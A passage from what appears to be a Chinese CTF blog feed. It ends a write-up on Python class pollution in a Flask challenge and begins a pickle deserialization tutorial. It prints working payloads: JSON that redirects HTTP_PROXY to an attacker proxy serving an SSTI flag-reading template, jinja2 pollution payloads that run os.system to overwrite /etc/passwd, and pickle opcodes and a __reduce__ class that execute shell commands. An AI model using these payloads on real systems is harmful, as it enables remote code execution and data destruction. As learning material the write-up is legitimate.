class="string">&#x27;password&#x27;</span>: self.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里重载了_<em>init</em>_, 那么就可以通过init来污染了</p><p>但是flag在哪并不知道</p><p>这里发现加载了os模块, 那么就可以控制环境变量, 或许flag就在环境变量中</p><p>这里简单尝试一下污染respone0</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302101737306.png" alt="image-20240302101737306"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302101751821.png" alt="image-20240302101751821"></p><p>可以看见已经污染成功了</p><p>但是这里并没有什么用</p><p>仔细观察源码发现search的地方用了一次渲染</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template_string(data.text)</span><br></pre></td></tr></table></figure><p>而这个data来源于api.py读取的文件内容</p><p>稍微观察api.py 可以预测到当前还存在一个user的json文件</p><p>这样就又可以想到:</p><p>利用污染向user文件中插入一个模板字符串, 再把它读取出来渲染造成ssti</p><p>由于没有导入user,这里并不能修改user的内容</p><p>在harder学长的提示下 开始尝试污染http_proxy变量</p><h2 id="法一-污染HTTP-PROXY"><a href="#法一-污染HTTP-PROXY" class="headerlink" title="法一(污染HTTP_PROXY)"></a>法一(污染HTTP_PROXY)</h2><p>首先我们在vps上运行一个代理(当然这里是本地测试, 也可以不要vps), 将接收到的请求直接返回一个模板字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&#123;7*7&#125;&#125;&#x27;</span>, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;192.168.1.11&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">8899</span>)</span><br></pre></td></tr></table></figure><p>之后对HTTP_PROXY环境变量进行污染, 使得所有的http请求全部代理到我们的服务器上</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;environ&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;HTTP_PROXY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://192.168.1.11:8899/&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>开启vps进行监听</p><p>在此调用search的api</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302144331876.png" alt="image-20240302144331876"></p><p>可以看见这里返回49, 正是我们模板字符串被渲染后的值</p><p>之后就是ssti的利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">path</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /app/jW2SzsJM39euQ1sPj5JWpNRGcS1Etzbq_FLAG\&quot;).read()&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;%endfor%&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload, <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;192.168.1.11&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">8899</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240302154000485.png" alt="image-20240302154000485"></p><h2 id="法二-Flask变量污染"><a href="#法二-Flask变量污染" class="headerlink" title="法二(Flask变量污染)"></a>法二(Flask变量污染)</h2><p>参考:</p><p><a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p><h3 id="spec-获取sys"><a href="#spec-获取sys" class="headerlink" title="__spec__获取sys"></a><code>__spec__</code>获取sys</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__spec__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;echo 222 &gt; /etc/passwd&#x27;);#&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="loader-获取sys"><a href="#loader-获取sys" class="headerlink" title="__loader__获取sys"></a><code>__loader__</code>获取sys</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__loader__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;modules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;jinja2&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;runtime&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                        <span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                                            <span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;echo 111 &gt; /etc/passwd&#x27;);#&quot;</span></span><br><span class="line">                                        <span class="punctuation">]</span></span><br><span class="line">                                    <span class="punctuation">&#125;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="法三-污染requests模块的respone"><a href="#法三-污染requests模块的respone" class="headerlink" title="法三(污染requests模块的respone)"></a>法三(污染requests模块的respone)</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;requests&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /app/jW2SzsJM39euQ1sPj5JWpNRGcS1Etzbq_FLAG\&quot;).read()&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;%endfor%&#125;&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> Flask审计 </tag>
            
            <tag> Python原型链污染(类污染) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/2024/02/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/02/28/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><p>在pyhton中也存在序列化和反序列化的操作, 由pickle模块实现</p><p>与php中的<code>serialize()</code>和<code>unserialize()</code>相对应,在python中为<code>pickle.dump()</code>和<code>pickle.load()</code></p><p>示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;hello, world!&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;nacl&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(data, f) <span class="comment"># 序列化</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f)) <span class="comment"># 反序列化</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="comment"># b&#x27;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00\x8c\rhello, world!\x94.&#x27;</span></span><br><span class="line"><span class="comment"># hello, world!</span></span><br></pre></td></tr></table></figure><blockquote><p>pickle.load()用于从文件中加载序列化的对象</p><p>pickle.load()从字节流中加载序列化的对象</p><p>pickle.dump()将序列化的二进制数据保存到文件</p><p>pickle.dumps()直接返回序列化后的二进制流</p></blockquote><h2 id="reduce-方法"><a href="#reduce-方法" class="headerlink" title="__reduce__方法"></a><code>__reduce__</code>方法</h2><blockquote><p><code>__reduce__</code><br>调用:被定义之后，当对象被pickle时就会触发<br>作用:如果接收到的是字符串，就会把这个字符串当成一个全局变量的名称，然后Python查找它并进去pickle<br>    如果接收到的是元组，这个元组应该包含2-6个元素，其中包括：一个可调用对象，用于创建对象，参数元素，供对象调用</p></blockquote><p>例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">s = a() </span><br><span class="line">payload = pickle.dumps(s)</span><br><span class="line">pickle.loads(payload)</span><br></pre></td></tr></table></figure><p><strong>注: pickle反序列化后执行函数时会自动尝试导入未导入的模块, 所以即便网站应用并没有import os 也可以执行成功</strong></p><p>此时whoami会被执行,达到目的,</p><p>当然也可以通过os.system来执行命令反弹shell</p><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>opcode就是序列化后的结果, 实际上它是将对象等实例化为某种指令集的结果, 依靠PVM来解析</p><p>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python</p><p>由于其向前兼容的特性, 我们可以手动编写opcode指令, 反序列化即可执行恶意脚本</p><h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p>PVM由以下三部分组成</p><ul><li>指令处理器：从流中读取 <code>opcode</code> 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回。</li><li>stack：由 Python 的 <strong><code>list</code></strong> 实现，被用来临时存储数据、参数以及对象。</li><li>memo：由 Python 的 <strong><code>dict</code></strong> 实现，为 PVM 的整个生命周期提供存储。</li></ul><h2 id="常用的opcode"><a href="#常用的opcode" class="headerlink" title="常用的opcode"></a>常用的opcode</h2><table><thead><tr><th align="left">指令</th><th align="left">描述</th><th align="left">具体写法</th><th align="left">栈上的变化</th></tr></thead><tbody><tr><td align="left">c</td><td align="left">获取一个全局对象或import一个模块</td><td align="left">c[module]\n[instance]\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">o</td><td align="left">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td align="left">o</td><td align="left">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td></tr><tr><td align="left">i</td><td align="left">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td align="left">i[module]\n[callable]\n</td><td align="left">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td></tr><tr><td align="left">N</td><td align="left">实例化一个None</td><td align="left">N</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">S</td><td align="left">实例化一个字符串对象</td><td align="left">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">V</td><td align="left">实例化一个UNICODE字符串对象</td><td align="left">Vxxx\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">I</td><td align="left">实例化一个int对象</td><td align="left">Ixxx\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">F</td><td align="left">实例化一个float对象</td><td align="left">Fx.x\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">R</td><td align="left">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td align="left">R</td><td align="left">函数和参数出栈，函数的返回值入栈</td></tr><tr><td align="left">.</td><td align="left">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td align="left">.</td><td align="left">无</td></tr><tr><td align="left">(</td><td align="left">向栈中压入一个MARK标记</td><td align="left">(</td><td align="left">MARK标记入栈</td></tr><tr><td align="left">t</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为元组</td><td align="left">t</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">)</td><td align="left">向栈中直接压入一个空元组</td><td align="left">)</td><td align="left">空元组入栈</td></tr><tr><td align="left">l</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为列表</td><td align="left">l</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">]</td><td align="left">向栈中直接压入一个空列表</td><td align="left">]</td><td align="left">空列表入栈</td></tr><tr><td align="left">d</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td align="left">d</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">}</td><td align="left">向栈中直接压入一个空字典</td><td align="left">}</td><td align="left">空字典入栈</td></tr><tr><td align="left">p</td><td align="left">将栈顶对象储存至memo_n</td><td align="left">pn\n</td><td align="left">无</td></tr><tr><td align="left">g</td><td align="left">将memo_n的对象压栈</td><td align="left">gn\n</td><td align="left">对象被压栈</td></tr><tr><td align="left">0</td><td align="left">丢弃栈顶对象</td><td align="left">0</td><td align="left">栈顶对象被丢弃</td></tr><tr><td align="left">b</td><td align="left">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td align="left">b</td><td align="left">栈上第一个元素出栈</td></tr><tr><td align="left">s</td><td align="left">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td align="left">s</td><td align="left">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td></tr><tr><td align="left">u</td><td align="left">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td align="left">u</td><td align="left">MARK标记以及被组合的数据出栈，字典被更新</td></tr><tr><td align="left">a</td><td align="left">将栈的第一个元素append到第二个元素(列表)中</td><td align="left">a</td><td align="left">栈顶元素出栈，第二个元素（列表）被更新</td></tr><tr><td align="left">e</td><td align="left">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td align="left">e</td><td align="left">MARK标记以及被组合的数据出栈，列表被更新</td></tr></tbody></table><h2 id="函数执行opcode构造"><a href="#函数执行opcode构造" class="headerlink" title="函数执行opcode构造"></a>函数执行opcode构造</h2><p><code>R</code> :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;cos      # 使用c来import os模块</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;   # (压入mark标记   S实例化一个字符串对象</span><br><span class="line">tR.&#x27;&#x27;&#x27; # 寻找上一个mark标记并将之间的数据合并为一个元组 即(&#x27;whoami&#x27;,)</span><br><span class="line"> # R选择第一个对象为函数,第二个对象为参数 即os.system(&#x27;whoami&#x27;,)</span><br></pre></td></tr></table></figure><p><code>o</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos  # 使用c来import os模块</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27; # S实例化一个字符串对象</span><br><span class="line">o.&#x27;&#x27;&#x27;  # o寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）即 os.system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><p><code>i</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;  # (压入mark标记   S实例化一个字符串对象</span><br><span class="line">ios# i相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>下面搬运两张PVM解析opcode的动图演示</p><ul><li>PVM解析 <code>str</code> 的过程</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20200320230631-6204866e-6abc-1.gif"></p><ul><li>PVM解析 <code>__reduce__()</code> 的过程</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/20200320230711-7972c0ea-6abc-1.gif"></p><h2 id="Pker工具"><a href="#Pker工具" class="headerlink" title="Pker工具"></a>Pker工具</h2><p><a href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p><p>使用脚本来生成我们需要的opcode</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例:"></a>案例:</h2><h3 id="New-star-2023-Ye’s-Pickle"><a href="#New-star-2023-Ye’s-Pickle" class="headerlink" title="New star 2023 Ye’s Pickle"></a>New star 2023 Ye’s Pickle</h3><p>题目给出了附件</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.jwk <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits  <span class="comment"># 包含字母和数字</span></span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = generate_random_string(<span class="number">16</span>)</span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    payload=request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        token=verify_jwt(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span 